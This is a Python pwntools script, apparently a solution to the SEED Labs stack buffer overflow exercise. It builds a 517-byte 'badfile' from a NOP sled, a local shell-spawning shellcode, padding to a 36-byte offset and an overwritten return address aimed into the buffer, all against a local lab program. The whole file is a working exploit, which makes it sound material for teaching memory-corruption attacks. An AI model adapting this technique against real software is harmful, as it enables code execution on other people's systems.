#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

buffer_addr = 0xffffcce8
ret_offset = 36

# Generate shellcode
shellcode = asm(shellcraft.sh())
print(f"[+] Shellcode: {len(shellcode)} bytes")

# Payload must be EXACTLY 36 bytes before return address
# Structure: [NOPs + shellcode + padding] = 36 bytes total
nop_sled = b'\x90' * 8
combined = nop_sled + shellcode

# Pad to exactly 36 bytes
if len(combined) < ret_offset:
    combined += b'A' * (ret_offset - len(combined))
else:
    # If too long, reduce NOPs
    combined = shellcode
    combined = b'A' * (ret_offset - len(shellcode)) + shellcode

# Now add return address (points to start of buffer, into the padding before shellcode)
ret_addr = buffer_addr + (ret_offset - len(shellcode) - 4)  # Point just before shellcode
payload = combined + p32(ret_addr)

# Fill rest to 517
payload += b'C' * (517 - len(payload))

print(f"[+] Payload: {len(payload)} bytes")
print(f"[+] Return to: {hex(ret_addr)}")

with open('../vulnerable-programs/seedlabs-stack/badfile', 'wb') as f:
    f.write(payload)

print("[+] Run: cd ../vulnerable-programs/seedlabs-stack && ./stack")
